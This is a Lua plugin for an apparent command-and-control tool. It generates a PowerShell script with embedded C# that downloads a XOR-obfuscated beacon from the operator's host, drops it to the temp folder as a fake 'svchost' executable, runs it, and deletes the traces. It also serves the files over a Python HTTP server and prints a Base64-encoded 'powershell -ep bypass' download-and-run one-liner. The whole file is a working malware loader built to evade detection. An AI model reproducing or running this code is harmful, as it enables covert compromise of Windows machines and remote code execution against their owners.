-- Plugin: generate_stub - Usa C# en PowerShell para descargar, decodificar y ejecutar no_priv.exe ofuscado
-- Uso: set lhost 192.168.1.10; generate_stub

local function write_file(path, content)
    local file = io.open(path, "wb")
    if not file then return nil, "cannot write " .. path end
    file:write(content)
    file:close()
    return true
end

local function read_file(path)
    local file = io.open(path, "rb")
    if not file then return nil, "cannot read " .. path end
    local content = file:read("*all")
    file:close()
    return content
end

-- Aplica XOR a datos binarios
local function xor_data(data, key)
    local result = {}
    for i = 1, #data do
        table.insert(result, string.byte(data:sub(i,i)) ~ key)
    end
    return string.char(table.unpack(result))
end

-- Ofusca string para C# (bytes XOR)
local function xor_string(str, key)
    local bytes = {}
    for i = 1, #str do
        table.insert(bytes, string.byte(str:sub(i, i)) ~ key)
    end
    local hex = {}
    for _, b in ipairs(bytes) do
        table.insert(hex, string.format("0x%02X", b))
    end
    return table.concat(hex, ", "), #str
end

-- === Genera el script PowerShell con C# embebido (CORREGIDO) ===
local function generate_stub_ps1(lhost, xor_key_hex)
    local c2_url = "http://" .. lhost .. "/beacon.enc"
    local xor_key = tonumber(xor_key_hex, 16) or 0x33

    local obf_url, len_url = xor_string(c2_url, xor_key)

    return [[
$XorKey = ]] .. xor_key .. [[;
$UrlLen = ]] .. len_url .. [[;

$Source = @"
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class StubRunner {
    private const int XOR_KEY = ]] .. xor_key .. [[;
    private const int LEN_URL = ]] .. len_url .. [[;
    private static byte[] OBF_URL = new byte[] { ]] .. obf_url .. [[ };

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetTempPath(int length, StringBuilder buffer);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool DeleteFile(string lpFileName);

    static string DecryptUrl() {
        byte[] urlBytes = new byte[LEN_URL];
        for (int i = 0; i < LEN_URL; i++) {
            urlBytes[i] = (byte)(OBF_URL[i] ^ XOR_KEY);
        }
        return Encoding.UTF8.GetString(urlBytes);
    }

    static byte[] XorData(byte[] data) {
        byte[] output = new byte[data.Length];
        for (int i = 0; i < data.Length; i++) {
            output[i] = (byte)(data[i] ^ XOR_KEY);
        }
        return output;
    }

    static byte[] Base64Decode(string input) {
        try {
            return Convert.FromBase64String(input);
        } catch {
            return null;
        }
    }

    static string GetTempPath() {
        System.Text.StringBuilder sb = new System.Text.StringBuilder(260);
        GetTempPath(260, sb);
        return sb.ToString();
    }

    static string GenerateRandomExeName() {
        string tempPath = GetTempPath();
        string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        System.Random rand = new System.Random();
        System.Text.StringBuilder sb = new System.Text.StringBuilder("svchost_");
        for (int i = 0; i < 4; i++) {
            sb.Append(chars[rand.Next(chars.Length)]);
        }
        sb.Append(".exe");
        return System.IO.Path.Combine(tempPath, sb.ToString());
    }

    public static bool Run() {
        string url = DecryptUrl();
        System.Console.WriteLine("[*] Descargando desde: " + url);

        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;

        string base64Data;
        try {
            using (WebClient wc = new WebClient()) {
                wc.Headers["User-Agent"] = "Mozilla/5.0";
                base64Data = wc.DownloadString(url);
            }
        } catch (System.Exception ex) {
            System.Console.WriteLine("[-] Error descargando: " + ex.Message);
            return false;
        }

        if (string.IsNullOrWhiteSpace(base64Data)) {
            System.Console.WriteLine("[-] Datos vacíos");
            return false;
        }

        base64Data = base64Data.Replace("\\r", "").Replace("\\n", "").Replace(" ", "").Replace("\\t", "");
        byte[] raw;
        try {
            raw = Convert.FromBase64String(base64Data);
        } catch {
            System.Console.WriteLine("[-] Base64 inválido");
            return false;
        }

        if (raw == null || raw.Length == 0) return false;

        byte[] payload = XorData(raw);
        string outFile = GenerateRandomExeName();

        try {
            File.WriteAllBytes(outFile, payload);
            System.Console.WriteLine("[+] Ejecutando: " + outFile);
        } catch (System.Exception ex) {
            System.Console.WriteLine("[-] Error escribiendo: " + ex.Message);
            return false;
        }

        try {
            System.Diagnostics.Process.Start(outFile);
            System.Threading.Thread.Sleep(2000);
        } catch (System.Exception ex) {
            System.Console.WriteLine("[-] Error ejecutando: " + ex.Message);
            DeleteFile(outFile);
            return false;
        }

        DeleteFile(outFile);
        return true;
    }
}
"@

try {
    $Asm = Add-Type -TypeDefinition $Source -Language CSharp -PassThru -ErrorAction Stop
    [StubRunner]::Run()
    Remove-Item `$PSCommandPath -ErrorAction SilentlyContinue
} catch {
    Write-Error $("C# Error: " + $_.Exception.Message)
    exit 1
}
]]
end

-- === Comando principal: generate_stub ===
register_command("generate_stub", function()
    local lhost = app.params["lhost"]
    local xor_key_hex = "0x33"
    local xor_key = tonumber(xor_key_hex, 16) or 0x33

    if not lhost then
        return "Error: lhost not defined. Usage 'set lhost x.x.x.x'"
    end

    -- Rutas
    local output_enc = "sessions/beacon.enc"
    local ps1_path = "sessions/stub.ps1"
    local enc_url = "http://" .. lhost .. "/beacon.enc"
    local ps1_url = "http://" .. lhost .. "/stub.ps1"

    -- 1. Verificar que no_priv.exe existe
    local raw_data = read_file(output_enc)
    if not raw_data then
        app.one_cmd("c2 no_priv 1")
        return "[!] Error: beacon.enc not found. Executing 'c2 no_priv 1' first."
    end
    print("[+] Loading: " .. output_enc .. " (" .. #raw_data .. " bytes)")

    -- 3. Generar stub.ps1
    print("[*] Witchcrafting stub.ps1...")
    local ps1_content = generate_stub_ps1(lhost, xor_key_hex)
    write_file(ps1_path, ps1_content)
    print("[+] stub.ps1 summoned: " .. ps1_path)

    -- 4. One-liner de ejecución
    local oneliner = string.format(
        'powershell -ep bypass -c "IWR %s -OutFile stub.ps1; .\\stub.ps1"',
        ps1_url
    )

    -- 5. Iniciar servidor HTTP en sessions/
    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")
    print("\n[+] Server HTTP ready: http://" .. lhost .. ":80")
    print("    → /beacon.enc (binary ofuscated)")
    print("    → /stub.ps1 (C# loader)")

    -- 6. Mostrar one-liner y ofuscarlo en Base64 Windows
    print("\n[🔥] One-liner ready:")
    print("\n" .. oneliner .. "\n")

    -- Ofuscar como comando Windows Base64
    app.one_cmd("encodewinbase64 " .. oneliner)

    return "✅ generate_stub ready and copied to clipboard."
end)